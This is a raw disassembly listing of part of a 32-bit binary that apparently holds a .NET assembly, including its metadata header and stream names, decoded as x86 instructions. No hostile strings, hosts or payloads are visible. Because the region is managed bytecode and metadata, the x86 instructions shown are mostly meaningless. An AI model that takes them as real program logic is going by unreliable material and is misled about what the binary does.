100025bf:	00 0a                	add    %cl,(%edx)
100025c1:	2a 5e 03             	sub    0x3(%esi),%bl
100025c4:	7e 01                	jle    0x100025c7
100025c6:	00 00                	add    %al,(%eax)
100025c8:	04 03                	add    $0x3,%al
100025ca:	6f                   	outsl  %ds:(%esi),(%dx)
100025cb:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025d0:	27                   	daa
100025d1:	00 00                	add    %al,(%eax)
100025d3:	0a 6f 2e             	or     0x2e(%edi),%ch
100025d6:	00 00                	add    %al,(%eax)
100025d8:	0a 2a                	or     (%edx),%ch
100025da:	5e                   	pop    %esi
100025db:	03 7e 01             	add    0x1(%esi),%edi
100025de:	00 00                	add    %al,(%eax)
100025e0:	04 03                	add    $0x3,%al
100025e2:	6f                   	outsl  %ds:(%esi),(%dx)
100025e3:	2d 00 00 0a 6f       	sub    $0x6f0a0000,%eax
100025e8:	27                   	daa
100025e9:	00 00                	add    %al,(%eax)
100025eb:	0a 6f 2e             	or     0x2e(%edi),%ch
100025ee:	00 00                	add    %al,(%eax)
100025f0:	0a 2a                	or     (%edx),%ch
100025f2:	1e                   	push   %ds
100025f3:	02 28                	add    (%eax),%ch
100025f5:	2c 00                	sub    $0x0,%al
100025f7:	00 0a                	add    %cl,(%edx)
100025f9:	2a 4a 02             	sub    0x2(%edx),%cl
100025fc:	7b 1b                	jnp    0x10002619
100025fe:	00 00                	add    %al,(%eax)
10002600:	04 03                	add    $0x3,%al
10002602:	28 2f                	sub    %ch,(%edi)
10002604:	00 00                	add    %al,(%eax)
10002606:	0a 6f 30             	or     0x30(%edi),%ch
10002609:	00 00                	add    %al,(%eax)
1000260b:	0a 2a                	or     (%edx),%ch
1000260d:	00 00                	add    %al,(%eax)
1000260f:	00 42 53             	add    %al,0x53(%edx)
10002612:	4a                   	dec    %edx
10002613:	42                   	inc    %edx
10002614:	01 00                	add    %eax,(%eax)
10002616:	01 00                	add    %eax,(%eax)
10002618:	00 00                	add    %al,(%eax)
1000261a:	00 00                	add    %al,(%eax)
1000261c:	0c 00                	or     $0x0,%al
1000261e:	00 00                	add    %al,(%eax)
10002620:	76 34                	jbe    0x10002656
10002622:	2e 30 2e             	xor    %ch,%cs:(%esi)
10002625:	33 30                	xor    (%eax),%esi
10002627:	33 31                	xor    (%ecx),%esi
10002629:	39 00                	cmp    %eax,(%eax)
1000262b:	00 00                	add    %al,(%eax)
1000262d:	00 05 00 6c 00 00    	add    %al,0x6c00
10002633:	00 50 06             	add    %dl,0x6(%eax)
10002636:	00 00                	add    %al,(%eax)
10002638:	23 7e 00             	and    0x0(%esi),%edi
1000263b:	00 bc 06 00 00 f8 09 	add    %bh,0x9f80000(%esi,%eax,1)
10002642:	00 00                	add    %al,(%eax)
10002644:	23 53 74             	and    0x74(%ebx),%edx
10002647:	72 69                	jb     0x100026b2
10002649:	6e                   	outsb  %ds:(%esi),(%dx)
1000264a:	67 73 00             	addr16 jae 0x1000264d
1000264d:	00 00                	add    %al,(%eax)
1000264f:	00 b4 10 00 00 3c 17 	add    %dh,0x173c0000(%eax,%edx,1)
10002656:	00 00                	add    %al,(%eax)
10002658:	23 55 53             	and    0x53(%ebp),%edx
1000265b:	00 f0                	add    %dh,%al
1000265d:	27                   	daa
1000265e:	00 00                	add    %al,(%eax)
10002660:	10 00                	adc    %al,(%eax)
10002662:	00 00                	add    %al,(%eax)
10002664:	23 47 55             	and    0x55(%edi),%eax
10002667:	49                   	dec    %ecx
10002668:	44                   	inc    %esp
10002669:	00 00                	add    %al,(%eax)
1000266b:	00 00                	add    %al,(%eax)
1000266d:	28 00                	sub    %al,(%eax)
1000266f:	00 9c 02 00 00 23 42 	add    %bl,0x42230000(%edx,%eax,1)
10002676:	6c                   	insb   (%dx),%es:(%edi)
10002677:	6f                   	outsl  %ds:(%esi),(%dx)
10002678:	62 00                	bound  %eax,(%eax)
1000267a:	00 00                	add    %al,(%eax)
1000267c:	00 00                	add    %al,(%eax)
1000267e:	00 00                	add    %al,(%eax)
10002680:	02 00                	add    (%eax),%al
10002682:	00 01                	add    %al,(%ecx)
10002684:	57                   	push   %edi
10002685:	15 02 1c 09 0a       	adc    $0xa091c02,%eax
1000268a:	00 00                	add    %al,(%eax)
1000268c:	00 fa                	add    %bh,%dl
1000268e:	01 33                	add    %esi,(%ebx)
10002690:	00 16                	add    %dl,(%esi)
10002692:	00 00                	add    %al,(%eax)
10002694:	01 00                	add    %eax,(%eax)
10002696:	00 00                	add    %al,(%eax)
10002698:	24 00                	and    $0x0,%al
1000269a:	00 00                	add    %al,(%eax)
1000269c:	06                   	push   %es
1000269d:	00 00                	add    %al,(%eax)
1000269f:	00 1b                	add    %bl,(%ebx)
100026a1:	00 00                	add    %al,(%eax)
100026a3:	00 12                	add    %dl,(%edx)
100026a5:	00 00                	add    %al,(%eax)
100026a7:	00 25 00 00 00 30    	add    %ah,0x30000000
100026ad:	00 00                	add    %al,(%eax)
100026af:	00 12                	add    %dl,(%edx)
100026b1:	00 00                	add    %al,(%eax)
100026b3:	00 03                	add    %al,(%ebx)
100026b5:	00 00                	add    %al,(%eax)
100026b7:	00 01                	add    %al,(%ecx)
100026b9:	00 00                	add    %al,(%eax)
100026bb:	00 03                	add    %al,(%ebx)
100026bd:	00 00                	add    %al,(%eax)
100026bf:	00 06                	add    %al,(%esi)
100026c1:	00 00                	add    %al,(%eax)
100026c3:	00 01                	add    %al,(%ecx)
100026c5:	00 00                	add    %al,(%eax)
100026c7:	00 03                	add    %al,(%ebx)
100026c9:	00 00                	add    %al,(%eax)
100026cb:	00 04 00             	add    %al,(%eax,%eax,1)
100026ce:	00 00                	add    %al,(%eax)
100026d0:	06                   	push   %es
100026d1:	00 00                	add    %al,(%eax)
100026d3:	00 00                	add    %al,(%eax)
100026d5:	00 70 07             	add    %dh,0x7(%eax)
100026d8:	01 00                	add    %eax,(%eax)
100026da:	00 00                	add    %al,(%eax)
100026dc:	00 00                	add    %al,(%eax)
100026de:	06                   	push   %es
100026df:	00 25 06 c7 08 06    	add    %ah,0x608c706
100026e5:	00 92 06 c7 08 06    	add    %dl,0x608c706(%edx)
100026eb:	00 59 05             	add    %bl,0x5(%ecx)
100026ee:	95                   	xchg   %eax,%ebp
100026ef:	08 0f                	or     %cl,(%edi)
100026f1:	00 e7                	add    %ah,%bh
100026f3:	08 00                	or     %al,(%eax)
100026f5:	00 06                	add    %al,(%esi)
100026f7:	00 81 05 e6 07 06    	add    %al,0x607e605(%ecx)
100026fd:	00 08                	add    %cl,(%eax)
100026ff:	06                   	push   %es
10002700:	e6 07                	out    %al,$0x7
10002702:	06                   	push   %es
10002703:	00 e9                	add    %ch,%cl
10002705:	05 e6 07 06 00       	add    $0x607e6,%eax
1000270a:	79 06                	jns    0x10002712
1000270c:	e6 07                	out    %al,$0x7
1000270e:	06                   	push   %es
1000270f:	00 45 06             	add    %al,0x6(%ebp)
10002712:	e6 07                	out    %al,$0x7
10002714:	06                   	push   %es
10002715:	00 5e 06             	add    %bl,0x6(%esi)
10002718:	e6 07                	out    %al,$0x7
1000271a:	06                   	push   %es
1000271b:	00 98 05 e6 07 06    	add    %bl,0x607e605(%eax)
10002721:	00 6d 05             	add    %ch,0x5(%ebp)
10002724:	a8 08                	test   $0x8,%al
10002726:	06                   	push   %es
10002727:	00 4b 05             	add    %cl,0x5(%ebx)
1000272a:	a8 08                	test   $0x8,%al
1000272c:	06                   	push   %es
1000272d:	00 cc                	add    %cl,%ah
1000272f:	05 e6 07 06 00       	add    $0x607e6,%eax
10002734:	b3 05                	mov    $0x5,%bl
10002736:	d1 06                	roll   $1,(%esi)
10002738:	06                   	push   %es
10002739:	00 2e                	add    %ch,(%esi)
1000273b:	09 a2 07 06 00 a9    	or     %esp,-0x56fff9f9(%edx)
10002741:	07                   	pop    %es
10002742:	a2 07 0a 00 18       	mov    %al,0x18000a07
10002747:	09 95 08 06 00 05    	or     %edx,0x5000608(%ebp)
1000274d:	08 a2 07 06 00 30    	or     %ah,0x30000607(%edx)
10002753:	05 c7 08 06 00       	add    $0x608c7,%eax
10002758:	14 05                	adc    $0x5,%al
1000275a:	a2 07 06 00 72       	mov    %al,0x72000607
1000275f:	01 a2 07 06 00 2c    	add    %esp,0x2c000607(%edx)
10002765:	01 45 04             	add    %eax,0x4(%ebp)
10002768:	06                   	push   %es
10002769:	00 c8                	add    %cl,%al
1000276b:	06                   	push   %es
1000276c:	49                   	dec    %ecx
1000276d:	09 06                	or     %eax,(%esi)
1000276f:	00 3c 09             	add    %bh,(%ecx,%ecx,1)
10002772:	a2 07 06 00 ff       	mov    %al,0xff000607
10002777:	06                   	push   %es
10002778:	a2 07 0e 00 eb       	mov    %al,0xeb000e07
1000277d:	04 4e                	add    $0x4e,%al
1000277f:	08 06                	or     %al,(%esi)
10002781:	00 1e                	add    %bl,(%esi)
10002783:	01 45 04             	add    %eax,0x4(%ebp)
10002786:	06                   	push   %es
10002787:	00 5b 07             	add    %bl,0x7(%ebx)
1000278a:	a8 08                	test   $0x8,%al
1000278c:	06                   	push   %es
1000278d:	00 67 08             	add    %ah,0x8(%edi)
10002790:	a2 07 06 00 9c       	mov    %al,0x9c000607
10002795:	04 b7                	add    $0xb7,%al
10002797:	06                   	push   %es
10002798:	06                   	push   %es
10002799:	00 c9                	add    %cl,%cl
1000279b:	09 65 03             	or     %esp,0x3(%ebp)
1000279e:	06                   	push   %es
1000279f:	00 f8                	add    %bh,%al
100027a1:	07                   	pop    %es
100027a2:	65 03 06             	add    %gs:(%esi),%eax
100027a5:	00 06                	add    %al,(%esi)
100027a7:	07                   	pop    %es
100027a8:	65 03 06             	add    %gs:(%esi),%eax
100027ab:	00 0f                	add    %cl,(%edi)
100027ad:	08 65 03             	or     %ah,0x3(%ebp)
100027b0:	06                   	push   %es
100027b1:	00 02                	add    %al,(%edx)
100027b3:	05 65 03 00 00       	add    $0x365,%eax
100027b8:	00 00                	add    %al,(%eax)
100027ba:	1e                   	push   %ds
100027bb:	02 00                	add    (%eax),%al
100027bd:	00 00                	add    %al,(%eax)
100027bf:	00 01                	add    %al,(%ecx)
100027c1:	00 01                	add    %al,(%ecx)
100027c3:	00 81 01 10 00 3f    	add    %al,0x3f001001(%ecx)
100027c9:	08 3f                	or     %bh,(%edi)
100027cb:	08 41 00             	or     %al,0x0(%ecx)
100027ce:	01 00                	add    %eax,(%eax)
100027d0:	01 00                	add    %eax,(%eax)
100027d2:	0b 01                	or     (%ecx),%eax
100027d4:	10 00                	adc    %al,(%eax)
100027d6:	59                   	pop    %ecx
100027d7:	03 00                	add    (%eax),%eax
100027d9:	00 55 00             	add    %dl,0x0(%ebp)
100027dc:	02 00                	add    (%eax),%al
100027de:	0d 00 0b 01 10       	or     $0x10010b00,%eax
100027e3:	00 45 03             	add    %al,0x3(%ebp)
100027e6:	00 00                	add    %al,(%eax)
100027e8:	55                   	push   %ebp
100027e9:	00 14 00             	add    %dl,(%eax,%eax,1)
100027ec:	0d 00 03 21 10       	or     $0x10210300,%eax
100027f1:	00 41 04             	add    %al,0x4(%ecx)
100027f4:	00 00                	add    %al,(%eax)
100027f6:	41                   	inc    %ecx
100027f7:	00 18                	add    %bl,(%eax)
100027f9:	00 0d 00 03 01 10    	add    %cl,0x10010300
100027ff:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
10002803:	00 41 00             	add    %al,0x0(%ecx)
10002806:	1b 00                	sbb    (%eax),%eax
10002808:	11 00                	adc    %eax,(%eax)
1000280a:	11 00                	adc    %eax,(%eax)
1000280c:	17                   	pop    %ss
1000280d:	00 31                	add    %dh,(%ecx)
1000280f:	01 06                	add    %eax,(%esi)
10002811:	00 35 04 35 01 06    	add    %dh,0x6013504
10002817:	00 df                	add    %bl,%bh
10002819:	09 38                	or     %edi,(%eax)
1000281b:	01 06                	add    %eax,(%esi)
1000281d:	00 90 01 38 01 06    	add    %dl,0x6013801(%eax)
10002823:	00 f7                	add    %dh,%bh
10002825:	02 38                	add    (%eax),%bh
10002827:	01 06                	add    %eax,(%esi)
10002829:	00 14 04             	add    %dl,(%esp,%eax,1)
1000282c:	3b 01                	cmp    (%ecx),%eax
1000282e:	06                   	push   %es
1000282f:	00 18                	add    %bl,(%eax)
10002831:	04 3b                	add    $0x3b,%al
10002833:	01 06                	add    %eax,(%esi)
10002835:	00 33                	add    %dh,(%ebx)
10002837:	01 3b                	add    %edi,(%ebx)
10002839:	01 06                	add    %eax,(%esi)
1000283b:	00 e2                	add    %ah,%dl
1000283d:	02 3b                	add    (%ebx),%bh
1000283f:	01 06                	add    %eax,(%esi)
10002841:	00 c7                	add    %al,%bh
10002843:	03 3b                	add    (%ebx),%edi
10002845:	01 06                	add    %eax,(%esi)
10002847:	00 88 07 3b 01 06    	add    %cl,0x6013b07(%eax)
1000284d:	00 b5 04 3b 01 06    	add    %dh,0x6013b04(%ebp)
10002853:	00 d6                	add    %dl,%dh
10002855:	00 3b                	add    %bh,(%ebx)
10002857:	01 06                	add    %eax,(%esi)
10002859:	00 16                	add    %dl,(%esi)
1000285b:	07                   	pop    %es
1000285c:	3e 01 06             	add    %eax,%ds:(%esi)
1000285f:	00 73 02             	add    %dh,0x2(%ebx)
10002862:	3e 01 06             	add    %eax,%ds:(%esi)
10002865:	00 1c 04             	add    %bl,(%esp,%eax,1)
10002868:	9c                   	pushf
10002869:	00 06                	add    %al,(%esi)
1000286b:	00 27                	add    %ah,(%edi)
1000286d:	02 9c 00 06 00 60 04 	add    0x4600006(%eax,%eax,1),%bl
10002874:	9c                   	pushf
10002875:	00 06                	add    %al,(%esi)
10002877:	00 b3 03 9c 00 06    	add    %dh,0x6009c03(%ebx)
1000287d:	00 cd                	add    %cl,%ch
1000287f:	01 9c 00 06 00 45 07 	add    %ebx,0x7450006(%eax,%eax,1)
10002886:	9c                   	pushf
10002887:	00 06                	add    %al,(%esi)
10002889:	00 9d 02 35 01 06    	add    %bl,0x6013502(%ebp)
1000288f:	00 d4                	add    %dl,%ah
10002891:	04 35                	add    $0x35,%al
10002893:	01 36                	add    %esi,(%esi)
10002895:	00 1a                	add    %bl,(%edx)
10002897:	02 41 01             	add    0x1(%ecx),%al
1000289a:	16                   	push   %ss
1000289b:	00 89 00 45 01 16    	add    %cl,0x16014500(%ecx)
100028a1:	00 b2 00 45 01 06    	add    %dh,0x6014500(%edx)
100028a7:	00 5c 02 4d          	add    %bl,0x4d(%edx,%eax,1)
100028ab:	01 00                	add    %eax,(%eax)
100028ad:	00 00                	add    %al,(%eax)
100028af:	00 80 00 91 20 f6    	add    %al,-0x9df6f00(%eax)
100028b5:	04 54                	add    $0x54,%al
100028b7:	01 01                	add    %eax,(%ecx)
100028b9:	00 00                	add    %al,(%eax)
100028bb:	00 00                	add    %al,(%eax)
100028bd:	00 80 00 91 20 12    	add    %al,0x12209100(%eax)
100028c3:	09 59 01             	or     %ebx,0x1(%ecx)
100028c6:	02 00                	add    (%eax),%al
100028c8:	00 00                	add    %al,(%eax)
100028ca:	00 00                	add    %al,(%eax)
100028cc:	80 00 91             	addb   $0x91,(%eax)
100028cf:	20 7e 04             	and    %bh,0x4(%esi)
100028d2:	6b 01 0c             	imul   $0xc,(%ecx),%eax
100028d5:	00 50 20             	add    %dl,0x20(%eax)
100028d8:	00 00                	add    %al,(%eax)
100028da:	00 00                	add    %al,(%eax)
100028dc:	91                   	xchg   %eax,%ecx
100028dd:	00 02                	add    %al,(%edx)
100028df:	02 72 01             	add    0x1(%edx),%dh
100028e2:	0e                   	push   %cs
100028e3:	00 00                	add    %al,(%eax)
100028e5:	00 00                	add    %al,(%eax)
100028e7:	00 80 00 91 20 90    	add    %al,-0x6fdf6f00(%eax)
100028ed:	04 77                	add    $0x77,%al
100028ef:	01 0f                	add    %ecx,(%edi)
100028f1:	00 c4                	add    %al,%ah
100028f3:	20 00                	and    %al,(%eax)
100028f5:	00 00                	add    %al,(%eax)
100028f7:	00 91 00 f1 03 72    	add    %dl,0x7203f100(%ecx)
100028fd:	01 16                	add    %edx,(%esi)
100028ff:	00 00                	add    %al,(%eax)
10002901:	00 00                	add    %al,(%eax)
10002903:	00 80 00 91 20 68    	add    %al,0x68209100(%eax)
10002909:	09 83 01 17 00 00    	or     %eax,0x1701(%ebx)
1000290f:	00 00                	add    %al,(%eax)
10002911:	00 80 00 91 20 b0    	add    %al,-0x4fdf6f00(%eax)
10002917:	09 8c 01 1c 00 38 21 	or     %ecx,0x2138001c(%ecx,%eax,1)
1000291e:	00 00                	add    %al,(%eax)
10002920:	00 00                	add    %al,(%eax)
10002922:	96                   	xchg   %eax,%esi
10002923:	00 28                	add    %ch,(%eax)
10002925:	08 97 01 21 00 80    	or     %dl,-0x7fffdeff(%edi)
1000292b:	22 00                	and    (%eax),%al
1000292d:	00 00                	add    %al,(%eax)
1000292f:	00 91 18 60 08 9e    	add    %dl,-0x61f79fe8(%ecx)
10002935:	01 23                	add    %esp,(%ebx)
10002937:	00 8c 22 00 00 00 00 	add    %cl,0x0(%edx,%eiz,1)
1000293e:	93                   	xchg   %eax,%ebx
1000293f:	00 5a 00             	add    %bl,0x0(%edx)
10002942:	a2 01 23 00 fc       	mov    %al,0xfc002301
10002947:	24 00                	and    $0x0,%al
10002949:	00 00                	add    %al,(%eax)
1000294b:	00 93 00 eb 00 a2    	add    %dl,-0x5dff1500(%ebx)
10002951:	01 23                	add    %esp,(%ebx)
10002953:	00 ae 25 00 00 00    	add    %ch,0x25(%esi)
10002959:	00 91 18 60 08 9e    	add    %dl,-0x61f79fe8(%ecx)
1000295f:	01 23                	add    %esp,(%ebx)
10002961:	00 ba 25 00 00 00    	add    %bh,0x25(%edx)
10002967:	00 86 18 5a 08 06    	add    %al,0x6085a18(%esi)
1000296d:	00 23                	add    %ah,(%ebx)
1000296f:	00 c2                	add    %al,%dl
10002971:	25 00 00 00 00       	and    $0x0,%eax
10002976:	83 00 92             	addl   $0xffffff92,(%eax)
10002979:	00 a6 01 23 00 da    	add    %ah,-0x25ffdcff(%esi)
1000297f:	25 00 00 00 00       	and    $0x0,%eax
10002984:	83 00 bb             	addl   $0xffffffbb,(%eax)
10002987:	00 a6 01 24 00 f2    	add    %ah,-0xdffdbff(%esi)
1000298d:	25 00 00 00 00       	and    $0x0,%eax
10002992:	86 18                	xchg   %bl,(%eax)
10002994:	5a                   	pop    %edx
10002995:	08 06                	or     %al,(%esi)
10002997:	00 25 00 fa 25 00    	add    %ah,0x25fa00
1000299d:	00 00                	add    %al,(%eax)
1000299f:	00 83 00 55 01 ab    	add    %al,-0x54feab00(%ebx)
100029a5:	01 25 00 00 00 01    	add    %esp,0x1000000
100029ab:	00 77 09             	add    %dh,0x9(%edi)
100029ae:	00 00                	add    %al,(%eax)
100029b0:	01 00                	add    %eax,(%eax)
100029b2:	cc                   	int3
100029b3:	02 00                	add    (%eax),%al
100029b5:	00 02                	add    %al,(%edx)
100029b7:	00 88 02 00 00 03    	add    %cl,0x3000002(%eax)
100029bd:	00 87 03 00 00 04    	add    %al,0x4000003(%edi)
100029c3:	00 bd 01 00 00 05    	add    %bh,0x5000001(%ebp)
100029c9:	00 9a 03 00 00 06    	add    %bl,0x6000003(%edx)
100029cf:	00 04 04             	add    %al,(%esp,%eax,1)
100029d2:	00 00                	add    %al,(%eax)
100029d4:	07                   	pop    %es
100029d5:	00 2b                	add    %ch,(%ebx)
100029d7:	00 00                	add    %al,(%eax)
100029d9:	00 08                	add    %cl,(%eax)
100029db:	00 b0 07 00 00 09    	add    %dh,0x9000007(%eax)
100029e1:	00 01                	add    %al,(%ecx)
100029e3:	00 02                	add    %al,(%edx)
100029e5:	00 0a                	add    %cl,(%edx)
100029e7:	00 37                	add    %dh,(%edi)
100029e9:	02 00                	add    (%eax),%al
100029eb:	00 01                	add    %al,(%ecx)
100029ed:	00 45 07             	add    %al,0x7(%ebp)
100029f0:	02 00                	add    (%eax),%al
100029f2:	02 00                	add    (%eax),%al
100029f4:	e4 01                	in     $0x1,%al
100029f6:	00 00                	add    %al,(%eax)
100029f8:	01 00                	add    %eax,(%eax)
100029fa:	30 07                	xor    %al,(%edi)
100029fc:	00 00                	add    %al,(%eax)
100029fe:	01 00                	add    %eax,(%eax)
10002a00:	cd 01                	int    $0x1
10002a02:	00 00                	add    %al,(%eax)
10002a04:	02 00                	add    (%eax),%al
10002a06:	bd 01 00 00 03       	mov    $0x3000001,%ebp
10002a0b:	00 8d 09 00 00 04    	add    %cl,0x4000009(%ebp)
10002a11:	00 79 01             	add    %bh,0x1(%ecx)
10002a14:	00 00                	add    %al,(%eax)
10002a16:	05 00 1d 03 00       	add    $0x31d00,%eax
10002a1b:	00 06                	add    %al,(%esi)
10002a1d:	00 04 04             	add    %al,(%esp,%eax,1)
10002a20:	02 00                	add    (%eax),%al
10002a22:	07                   	pop    %es
10002a23:	00 83 08 00 00 01    	add    %al,0x1000008(%ebx)
10002a29:	00 30                	add    %dh,(%eax)
10002a2b:	07                   	pop    %es
10002a2c:	00 00                	add    %al,(%eax)
10002a2e:	01 00                	add    %eax,(%eax)
10002a30:	cd 01                	int    $0x1
10002a32:	00 00                	add    %al,(%eax)
10002a34:	02 00                	add    (%eax),%al
10002a36:	a5                   	movsl  %ds:(%esi),%es:(%edi)
10002a37:	01 00                	add    %eax,(%eax)
10002a39:	00 03                	add    %al,(%ebx)
10002a3b:	00 6f 03             	add    %ch,0x3(%edi)
10002a3e:	00 00                	add    %al,(%eax)
10002a40:	04 00                	add    $0x0,%al
10002a42:	e0 03                	loopne 0x10002a47
10002a44:	00 00                	add    %al,(%eax)
10002a46:	05 00 06 03 00       	add    $0x30600,%eax
10002a4b:	00 01                	add    %al,(%ecx)
10002a4d:	00 cd                	add    %cl,%ch
10002a4f:	01 00                	add    %eax,(%eax)
10002a51:	00 02                	add    %al,(%edx)
10002a53:	00 b6 02 00 00 03    	add    %dh,0x3000002(%esi)
10002a59:	00 55 09             	add    %dl,0x9(%ebp)
10002a5c:	00 00                	add    %al,(%eax)
10002a5e:	04 00                	add    $0x0,%al
10002a60:	42                   	inc    %edx
10002a61:	01 02                	add    %eax,(%edx)
10002a63:	00 05 00 4b 02 00    	add    %al,0x24b00
10002a69:	00 01                	add    %al,(%ecx)
10002a6b:	00 6e 08             	add    %ch,0x8(%esi)
10002a6e:	00 00                	add    %al,(%eax)
10002a70:	02 00                	add    (%eax),%al
10002a72:	30 03                	xor    %al,(%ebx)
10002a74:	00 00                	add    %al,(%eax)
10002a76:	01 00                	add    %eax,(%eax)
10002a78:	1e                   	push   %ds
10002a79:	09 00                	or     %eax,(%eax)
10002a7b:	00 01                	add    %al,(%ecx)
10002a7d:	00 1e                	add    %bl,(%esi)
10002a7f:	09 00                	or     %eax,(%eax)
10002a81:	00 01                	add    %al,(%ecx)
10002a83:	00 07                	add    %al,(%edi)
10002a85:	05 09 00 5a 08       	add    $0x85a0009,%eax
10002a8a:	01 00                	add    %eax,(%eax)
10002a8c:	11 00                	adc    %eax,(%eax)
10002a8e:	5a                   	pop    %edx
10002a8f:	08 06                	or     %al,(%esi)
10002a91:	00 19                	add    %bl,(%ecx)
10002a93:	00 5a 08             	add    %bl,0x8(%edx)
10002a96:	0a 00                	or     (%eax),%al
10002a98:	29 00                	sub    %eax,(%eax)
10002a9a:	5a                   	pop    %edx
10002a9b:	08 10                	or     %dl,(%eax)
10002a9d:	00 31                	add    %dh,(%ecx)
10002a9f:	00 5a 08             	add    %bl,0x8(%edx)
10002aa2:	10 00                	adc    %al,(%eax)
10002aa4:	39 00                	cmp    %eax,(%eax)
10002aa6:	5a                   	pop    %edx
10002aa7:	08 10                	or     %dl,(%eax)
10002aa9:	00 41 00             	add    %al,0x0(%ecx)
10002aac:	5a                   	pop    %edx
10002aad:	08 10                	or     %dl,(%eax)
10002aaf:	00 49 00             	add    %cl,0x0(%ecx)
10002ab2:	5a                   	pop    %edx
10002ab3:	08 10                	or     %dl,(%eax)
10002ab5:	00 51 00             	add    %dl,0x0(%ecx)
10002ab8:	5a                   	pop    %edx
10002ab9:	08 10                	or     %dl,(%eax)
10002abb:	00 59 00             	add    %bl,0x0(%ecx)
10002abe:	5a                   	pop    %edx
10002abf:	08 10                	or     %dl,(%eax)
10002ac1:	00 61 00             	add    %ah,0x0(%ecx)
10002ac4:	5a                   	pop    %edx
10002ac5:	08 15 00 69 00 5a    	or     %dl,0x5a006900
10002acb:	08 10                	or     %dl,(%eax)
10002acd:	00 71 00             	add    %dh,0x0(%ecx)
10002ad0:	5a                   	pop    %edx
10002ad1:	08 10                	or     %dl,(%eax)
10002ad3:	00 79 00             	add    %bh,0x0(%ecx)
10002ad6:	5a                   	pop    %edx
10002ad7:	08 10                	or     %dl,(%eax)
10002ad9:	00 a1 00 5a 08 06    	add    %ah,0x6085a00(%ecx)
10002adf:	00 c1                	add    %al,%cl
10002ae1:	00 f9                	add    %bh,%cl
10002ae3:	01 1a                	add    %ebx,(%edx)
10002ae5:	00 c9                	add    %cl,%cl
10002ae7:	00 eb                	add    %ch,%bl
10002ae9:	06                   	push   %es
10002aea:	1f                   	pop    %ds
10002aeb:	00 c1                	add    %al,%cl
10002aed:	00 fc                	add    %bh,%ah
10002aef:	06                   	push   %es
10002af0:	25 00 d1 00 cc       	and    $0xcc00d100,%eax
10002af5:	04 2b                	add    $0x2b,%al
10002af7:	00 d9                	add    %bl,%cl
10002af9:	00 27                	add    %ah,(%edi)
10002afb:	09 31                	or     %esi,(%ecx)
10002afd:	00 0c 00             	add    %cl,(%eax,%eax,1)
10002b00:	5a                   	pop    %edx
10002b01:	08 49 00             	or     %cl,0x0(%ecx)
10002b04:	d9 00                	flds   (%eax)
10002b06:	35 09 4f 00 d9       	xor    $0xd9004f09,%eax
10002b0b:	00 a3 09 6c 00 d1    	add    %ah,-0x2eff93f7(%ebx)
10002b11:	00 5a 08             	add    %bl,0x8(%edx)
10002b14:	7d 00                	jge    0x10002b16
10002b16:	e9 00 b0 06 90       	jmp    0xa006db1b
10002b1b:	00 f1                	add    %dh,%cl
10002b1d:	00 1d 08 9c 00 f1    	add    %bl,0xf1009c08
10002b23:	00 d3                	add    %dl,%bl
10002b25:	09 9f 00 99 00 5a    	or     %ebx,0x5a009900(%edi)
10002b2b:	08 10                	or     %dl,(%eax)
10002b2d:	00 f9                	add    %bh,%cl
10002b2f:	00 22                	add    %ah,(%edx)
10002b31:	08 a5 00 91 00 6f    	or     %ah,0x6f009100(%ebp)
10002b37:	04 aa                	add    $0xaa,%al
10002b39:	00 91 00 a7 04 b0    	add    %dl,-0x4ffb5900(%ecx)
10002b3f:	00 91 00 83 07 06    	add    %dl,0x6078300(%ecx)
10002b45:	00 89 00 5a 08 06    	add    %cl,0x6085a00(%ecx)
10002b4b:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b4e:	5a                   	pop    %edx
10002b4f:	08 06                	or     %al,(%esi)
10002b51:	00 14 00             	add    %dl,(%eax,%eax,1)
10002b54:	a3 04 c1 00 01       	mov    %eax,0x100c104
10002b59:	01 f6                	add    %esi,%esi
10002b5b:	08 c7                	or     %al,%bh
10002b5d:	00 1c 00             	add    %bl,(%eax,%eax,1)
10002b60:	5a                   	pop    %edx
10002b61:	08 49 00             	or     %cl,0x0(%ecx)
10002b64:	d9 00                	flds   (%eax)
10002b66:	1e                   	push   %ds
10002b67:	05 d8 00 89 00       	add    $0x8900d8,%eax
10002b6c:	44                   	inc    %esp
10002b6d:	09 ef                	or     %ebp,%edi
10002b6f:	00 11                	add    %dl,(%ecx)
10002b71:	01 0c 05 f9 00 01 01 	add    %ecx,0x10100f9(,%eax,1)
10002b78:	c3                   	ret
10002b79:	09 ff                	or     %edi,%edi
10002b7b:	00 d1                	add    %dl,%cl
10002b7d:	00 20                	add    %ah,(%eax)
10002b7f:	09 06                	or     %eax,(%esi)
10002b81:	01 21                	add    %esp,(%ecx)
10002b83:	01 ab 09 0d 01 81    	add    %ebp,-0x7efef2f7(%ebx)
10002b89:	00 5a 08             	add    %bl,0x8(%edx)
10002b8c:	06                   	push   %es
10002b8d:	00 d1                	add    %dl,%cl
10002b8f:	00 0b                	add    %cl,(%ebx)
10002b91:	07                   	pop    %es
10002b92:	14 01                	adc    $0x1,%al
10002b94:	d1 00                	roll   $1,(%eax)
10002b96:	08 09                	or     %cl,(%ecx)
10002b98:	18 01                	sbb    %al,(%ecx)
10002b9a:	11 01                	adc    %eax,(%ecx)
10002b9c:	ca 07 1d             	lret   $0x1d07
10002b9f:	01 14 00             	add    %edx,(%eax,%eax,1)
10002ba2:	ff 08                	decl   (%eax)
10002ba4:	22 01                	and    (%ecx),%al
10002ba6:	2e 00 0b             	add    %cl,%cs:(%ebx)
10002ba9:	00 b0 01 2e 00 13    	add    %dh,0x13002e01(%eax)
10002baf:	00 b9 01 2e 00 1b    	add    %bh,0x1b002e01(%ecx)
10002bb5:	00 d8                	add    %bl,%al
10002bb7:	01 2e                	add    %ebp,(%esi)
10002bb9:	00 23                	add    %ah,(%ebx)
10002bbb:	00 e1                	add    %ah,%cl
10002bbd:	01 2e                	add    %ebp,(%esi)
10002bbf:	00 2b                	add    %ch,(%ebx)
10002bc1:	00 f5                	add    %dh,%ch
10002bc3:	01 2e                	add    %ebp,(%esi)
10002bc5:	00 33                	add    %dh,(%ebx)
10002bc7:	00 f5                	add    %dh,%ch
10002bc9:	01 2e                	add    %ebp,(%esi)
10002bcb:	00 3b                	add    %bh,(%ebx)
10002bcd:	00 f5                	add    %dh,%ch
10002bcf:	01 2e                	add    %ebp,(%esi)
10002bd1:	00 43 00             	add    %al,0x0(%ebx)
10002bd4:	e1 01                	loope  0x10002bd7
10002bd6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
10002bda:	fb                   	sti
